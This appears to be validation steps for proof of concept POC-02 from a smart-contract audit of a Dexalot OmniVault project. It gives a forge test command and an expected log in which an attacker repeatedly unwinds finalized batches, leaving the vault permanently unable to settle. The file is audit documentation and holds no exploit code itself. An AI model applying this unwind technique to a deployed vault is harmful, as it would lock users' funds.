# POC-02 — Validation Steps

## Steps

```bash
cd dexalot-omnivault-audit
forge test --match-test testPOC02_InfiniteUnwindLoop -vvv
```

## Expected Output

```
[PASS] testPOC02_InfiniteUnwindLoop()
Logs:
  [+] Round 1: batch 0 finalized
  [EXPLOIT] Round 1: attacker unwound batch 0
  [+] Round 2: batch 1 finalized
  [EXPLOIT] Round 2: attacker unwound batch 1
  [+] Round 3: batch 2 finalized
  [EXPLOIT] Round 3: attacker unwound batch 2
  [EXPLOIT] Vault settled 0 batches out of 3 attempts
  [EXPLOIT] POC-02 CONFIRMED: vault permanently blocked
```

## Proof

`assertEq(settled, 0)` passes — zero batches settled across three full cycles.
